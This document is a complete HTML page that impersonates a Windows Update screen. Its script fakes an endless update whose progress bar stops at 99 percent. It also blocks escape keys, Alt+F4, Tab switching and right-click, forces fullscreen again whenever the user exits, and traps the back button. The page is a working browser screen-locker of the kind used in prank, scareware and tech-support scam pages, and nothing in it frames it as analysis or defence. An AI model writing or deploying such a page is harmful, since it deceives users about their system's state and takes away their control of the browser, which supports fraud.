 <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Windows Update</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    background: linear-gradient(135deg, #005a9e 0%, #003f6b 100%);
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    height: 100vh;
    width: 100vw;
    overflow: hidden;
    display: flex;
    justify-content: center;
    align-items: center;
    color: white;
    cursor: wait;
    user-select: none;
    -webkit-user-select: none;
  }

  .container {
    text-align: center;
    max-width: 600px;
    padding: 40px;
  }

  .logo {
    width: 80px;
    height: 80px;
    margin: 0 auto 30px auto;
    background: rgba(255, 255, 255, 0.15);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 48px;
    animation: pulse 2s infinite;
  }

  @keyframes pulse {
    0%, 100% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.05); opacity: 0.8; }
  }

  h1 {
    font-size: 36px;
    font-weight: 300;
    margin-bottom: 10px;
    letter-spacing: 0.5px;
  }

  .subtitle {
    font-size: 16px;
    color: rgba(255, 255, 255, 0.7);
    margin-bottom: 40px;
  }

  .progress-container {
    width: 100%;
    max-width: 480px;
    margin: 0 auto;
    background: rgba(255, 255, 255, 0.2);
    border-radius: 12px;
    height: 14px;
    overflow: hidden;
    position: relative;
  }

  .progress-bar {
    height: 100%;
    width: 3%;
    background: linear-gradient(90deg, #4db8ff, #7ac4ff);
    border-radius: 12px;
    transition: width 0.5s ease;
    position: relative;
  }

  .progress-bar::after {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
    animation: shimmer 2s infinite;
  }

  @keyframes shimmer {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
  }

  .progress-label {
    font-size: 14px;
    color: rgba(255, 255, 255, 0.8);
    margin-top: 12px;
    font-family: 'Segoe UI', monospace;
  }

  .info-text {
    font-size: 13px;
    color: rgba(255, 255, 255, 0.5);
    margin-top: 50px;
    line-height: 1.6;
  }

  .spinner-container {
    margin: 30px auto 0;
    display: flex;
    justify-content: center;
    gap: 8px;
  }

  .dot {
    width: 10px;
    height: 10px;
    background: rgba(255, 255, 255, 0.4);
    border-radius: 50%;
    animation: dotPulse 1.5s infinite ease-in-out;
  }

  .dot:nth-child(2) { animation-delay: 0.2s; }
  .dot:nth-child(3) { animation-delay: 0.4s; }

  @keyframes dotPulse {
    0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
    40% { transform: scale(1); opacity: 1; }
  }

  .restart-notice {
    margin-top: 25px;
    font-size: 13px;
    color: rgba(255, 255, 255, 0.35);
    animation: fadeInOut 4s infinite;
  }

  @keyframes fadeInOut {
    0%, 100% { opacity: 0.35; }
    50% { opacity: 0.7; }
  }

  /* Fullscreen lock - prevent escape */
  .overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: #003f6b;
    z-index: 9999;
    display: none;
  }

  /* Prevent right-click, text selection */
  img, a, button, input {
    display: none;
  }
</style>
</head>
<body>

<div class="overlay" id="fullscreenOverlay"></div>

<div class="container">
  <div class="logo">⚙️</div>
  <h1>Installing updates</h1>
  <p class="subtitle">Please wait a moment</p>

  <div class="progress-container">
    <div class="progress-bar" id="progressBar"></div>
  </div>
  <div class="progress-label" id="progressLabel">3%</div>

  <div class="spinner-container">
    <div class="dot"></div>
    <div class="dot"></div>
    <div class="dot"></div>
  </div>

  <p class="info-text">
    Your device may restart several times.<br>
    <strong>Do not turn off your device.</strong>
  </p>

  <p class="restart-notice" id="restartNotice">
    ⏳ Checking for updates...
  </p>
</div>

<script>
// Prevent all keyboard escape attempts
document.addEventListener('keydown', function(e) {
  // Block F11, Escape, Alt+F4, Ctrl+W, Ctrl+Q, Ctrl+R, F5, Ctrl+Shift+Esc, Alt+Tab, Win key
  const blocked = [27, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 
                   18, 9, 91, 92, 20, 44];
  
  if (blocked.includes(e.keyCode) || 
      e.key === 'Escape' || 
      e.key === 'F11' || 
      e.key === 'F5' ||
      (e.ctrlKey && ['w', 'q', 'r', 't', 'n', 's'].includes(e.key.toLowerCase())) ||
      (e.altKey && e.key === 'F4') ||
      (e.altKey && e.key === 'Tab') ||
      (e.metaKey && ['w', 'q'].includes(e.key.toLowerCase()))) {
    e.preventDefault();
    e.stopPropagation();
    return false;
  }
});

// Block right click
document.addEventListener('contextmenu', function(e) {
  e.preventDefault();
  return false;
});

// Block selection
document.addEventListener('selectstart', function(e) {
  e.preventDefault();
  return false;
});

// Try to enter fullscreen on load
function requestFullscreen() {
  const el = document.documentElement;
  if (el.requestFullscreen) {
    el.requestFullscreen().catch(() => {});
  } else if (el.webkitRequestFullscreen) {
    el.webkitRequestFullscreen();
  } else if (el.msRequestFullscreen) {
    el.msRequestFullscreen();
  }
}

// Re-enter fullscreen if user tries to exit
document.addEventListener('fullscreenchange', function() {
  if (!document.fullscreenElement) {
    setTimeout(requestFullscreen, 100);
  }
});

document.addEventListener('webkitfullscreenchange', function() {
  if (!document.webkitFullscreenElement) {
    setTimeout(requestFullscreen, 100);
  }
});

// Prevent visibility change (user switches tabs)
document.addEventListener('visibilitychange', function() {
  if (document.hidden) {
    setTimeout(function() {
      window.focus();
      requestFullscreen();
    }, 50);
  }
});

// Progressive percentage (slow but believable)
let percent = 3;
let phase = 0;

function updateProgress() {
  phase++;
  
  if (phase < 5) {
    // Slow start: 3% → 12%
    percent = 3 + (phase * 2);
  } else if (phase < 15) {
    // Slow middle: 12% → 30%
    percent = 12 + (phase * 1.5);
  } else if (phase < 30) {
    // Stalling: 30% → 45%
    percent = 30 + ((phase - 15) * 1);
  } else if (phase < 45) {
    // Medium progress: 45% → 65%
    percent = 45 + ((phase - 30) * 1.3);
  } else if (phase < 60) {
    // Slow again: 65% → 75%
    percent = 65 + ((phase - 45) * 0.7);
  } else if (phase < 80) {
    // Almost there: 75% → 90%
    percent = 75 + ((phase - 60) * 0.75);
  } else if (phase < 100) {
    // Final push: 90% → 99%
    percent = 90 + ((phase - 80) * 0.45);
  } else {
    // Never reach 100% — keep at 99%
    percent = 99;
  }
  
  if (percent > 99) percent = 99;
  
  document.getElementById('progressBar').style.width = percent + '%';
  document.getElementById('progressLabel').textContent = Math.floor(percent) + '%';
  
  // Update messages
  const notices = [
    '⏳ Checking for updates...',
    '📦 Downloading update 1 of 3...',
    '⚙️ Applying updates...',
    '🔄 Configuring system settings...',
    '📦 Downloading update 2 of 3...',
    '🔧 Installing component updates...',
    '📦 Downloading update 3 of 3...',
    '⚙️ Finalizing installation...',
    '🔄 Preparing for restart...',
    '⏳ Please wait...'
  ];
  
  const noticeIndex = Math.min(Math.floor(phase / 10), notices.length - 1);
  document.getElementById('restartNotice').textContent = notices[noticeIndex];
  
  // Speed changes (slow down over time)
  let delay = 800;
  if (phase > 20) delay = 1200;
  if (phase > 40) delay = 2000;
  if (phase > 60) delay = 3000;
  if (phase > 80) delay = 4000;
  
  setTimeout(updateProgress, delay);
}

// Start
setTimeout(function() {
  requestFullscreen();
  updateProgress();
}, 1000);

// Periodic re-fullscreen
setInterval(function() {
  if (!document.fullscreenElement && !document.webkitFullscreenElement) {
    requestFullscreen();
  }
}, 2000);

// Prevent browser back button
history.pushState(null, null, location.href);
window.onpopstate = function() {
  history.pushState(null, null, location.href);
};
</script>
</body>
</html>
